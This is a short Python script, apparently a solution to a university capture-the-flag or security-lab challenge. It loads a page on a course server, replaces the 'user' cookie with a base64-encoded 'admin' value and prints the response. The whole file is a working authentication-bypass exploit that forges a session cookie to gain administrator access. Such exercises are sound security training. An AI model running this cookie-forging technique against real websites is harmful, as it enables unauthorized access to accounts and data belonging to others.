import requests, base64

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23056"

s = requests.Session()
s.get(link)

cookies = requests.utils.dict_from_cookiejar(s.cookies)
s.cookies.set("user", base64.b64encode("admin".encode()).decode())

print(s.get(link).text)

